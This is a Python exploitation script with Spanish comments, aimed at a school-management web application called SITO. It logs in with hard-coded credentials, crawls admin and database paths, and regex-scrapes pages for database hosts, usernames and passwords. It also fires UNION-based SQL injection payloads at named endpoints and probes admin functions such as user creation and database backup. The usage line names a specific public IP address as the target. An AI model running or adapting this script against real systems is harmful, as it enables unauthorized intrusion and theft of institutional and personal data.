import requests
import sys
import urllib3
from urllib.parse import urljoin
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SITOExploiter:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.credentials = ('hnieto', 'utslp')
    
    def login_to_sito(self):
        """Login a la aplicación SITO"""
        print("[+] Iniciando sesión en SITO...")
        
        login_data = {
            'yAccion': 'login',
            'yUsuario': self.credentials[0],
            'xUsuario': self.credentials[0],
            'xContrasena': self.credentials[1],
            'yIntentos': '1'
        }
        
        try:
            response = self.session.post(f"{self.target}/jsp/index.jsp", data=login_data)
            
            if response.status_code == 200:
                # Verificar login exitoso
                if 'cerrar_sesion.jsp' in response.text or 'Bienvenido' in response.text:
                    print("✅ Login exitoso a SITO")
                    return True
                else:
                    print("❌ Login falló")
                    return False
                    
        except Exception as e:
            print(f"❌ Error en login: {e}")
            return False
    
    def explore_authenticated_area(self):
        """Explorar área autenticada"""
        print("\n[+] Explorando área autenticada...")
        
        # Rutas a explorar con sesión activa
        authenticated_paths = [
            '/jsp/admin/',
            '/jsp/admin/index.jsp',
            '/jsp/menu_principal.jsp',
            '/jsp/escolar/',
            '/jsp/configuracion/',
            '/jsp/reportes/',
            '/jsp/database/',
            '/jsp/usuarios/'
        ]
        
        accessible_paths = []
        
        for path in authenticated_paths:
            try:
                url = urljoin(self.target, path)
                response = self.session.get(url, timeout=8)
                
                if response.status_code == 200:
                    accessible_paths.append(path)
                    print(f"✅ Acceso a: {path} ({len(response.text)} bytes)")
                    
                    # Buscar información sensible
                    self.analyze_authenticated_page(path, response.text)
                    
                elif response.status_code == 403:
                    print(f"🔒 Acceso denegado: {path}")
                else:
                    print(f"❌ Error {response.status_code}: {path}")
                    
            except Exception as e:
                print(f"❌ Error en {path}: {e}")
        
        return accessible_paths
    
    def analyze_authenticated_page(self, path, content):
        """Analizar páginas autenticadas para información sensible"""
        # Buscar información de base de datos
        db_patterns = [
            r'jdbc:mysql://([^"<]+)',
            r'jdbc:oracle:thin:@([^"<]+)',
            r'database=([^"<]+)',
            r'username=([^"<]+)',
            r'password=([^"<]+)',
            r'host=([^"<]+)',
            r'port=([^"<]+)'
        ]
        
        for pattern in db_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                print(f"   🔍 Configuración BD encontrada en {path}:")
                for match in matches:
                    print(f"      {match}")
        
        # Buscar enlaces a funcionalidades administrativas
        admin_links = re.findall(r'href="([^"]*admin[^"]*)"', content, re.IGNORECASE)
        if admin_links:
            print(f"   🔗 Enlaces admin encontrados: {len(admin_links)}")
        
        # Buscar formularios con datos sensibles
        forms = re.findall(r'<form[^>]*>.*?</form>', content, re.DOTALL)
        if forms:
            print(f"   📋 Formularios encontrados: {len(forms)}")
    
    def exploit_sql_injection_authenticated(self):
        """Explotar SQL Injection con sesión autenticada"""
        print("\n[+] Probando SQL Injection autenticado...")
        
        # Endpoints que requieren autenticación
        endpoints = [
            '/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp',
            '/jsp/escolar/muestra_bachillerato_ajax.jsp',
            '/jsp/admin/buscar_usuario.jsp',
            '/jsp/reportes/generar_reporte.jsp'
        ]
        
        payloads = [
            "1",
            "1' OR '1'='1'-- ",
            "1' UNION SELECT user(),database(),version()-- ",
            "1' UNION SELECT table_name,column_name,3 FROM information_schema.columns-- "
        ]
        
        for endpoint in endpoints:
            print(f"\n🔍 Probando: {endpoint}")
            
            for payload in payloads:
                try:
                    url = f"{self.target}{endpoint}?xCveBachillerato={payload}"
                    response = self.session.get(url, timeout=10)
                    
                    print(f"   Payload: {payload[:30]}... -> Status: {response.status_code}")
                    
                    if response.status_code == 200 and len(response.text) > 0:
                        # Buscar datos de BD en la respuesta
                        if any(keyword in response.text.lower() for keyword in ['root', 'localhost', 'mysql', 'select', 'from']):
                            print(f"   🚨 POSIBLE DATOS DE BD: {response.text[:200]}...")
                            
                except Exception as e:
                    print(f"   ❌ Error: {e}")
    
    def try_privilege_escalation(self):
        """Intentar escalación de privilegios dentro de SITO"""
        print("\n[+] Intentando escalación de privilegios...")
        
        # Funcionalidades administrativas a probar
        admin_actions = [
            '/jsp/admin/crear_usuario.jsp',
            '/jsp/admin/cambiar_permisos.jsp',
            '/jsp/admin/backup_database.jsp',
            '/jsp/configuracion/modificar_config.jsp'
        ]
        
        for action in admin_actions:
            try:
                url = urljoin(self.target, action)
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200:
                    print(f"✅ Acceso a funcionalidad admin: {action}")
                elif response.status_code == 403:
                    print(f"🔒 Acceso denegado: {action}")
                else:
                    print(f"❌ Error {response.status_code}: {action}")
                    
            except Exception as e:
                print(f"❌ Error en {action}: {e}")
    
    def comprehensive_exploitation(self):
        """Explotación completa con las credenciales"""
        print("=== EXPLOTACIÓN SITO CON CREDENCIALES ===")
        print(f"Credenciales: {self.credentials[0]}:{self.credentials[1]}")
        
        # 1. Login
        if not self.login_to_sito():
            return
        
        # 2. Explorar área autenticada
        accessible_paths = self.explore_authenticated_area()
        
        # 3. SQL Injection autenticado
        self.exploit_sql_injection_authenticated()
        
        # 4. Escalación de privilegios
        self.try_privilege_escalation()
        
        print(f"\n✅ Explotación completada. Paths accesibles: {len(accessible_paths)}")

# Ejecutar
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: python sito_exploit.py http://189.254.143.102")
        sys.exit(1)
    
    target = sys.argv[1]
    exploiter = SITOExploiter(target)
    exploiter.comprehensive_exploitation()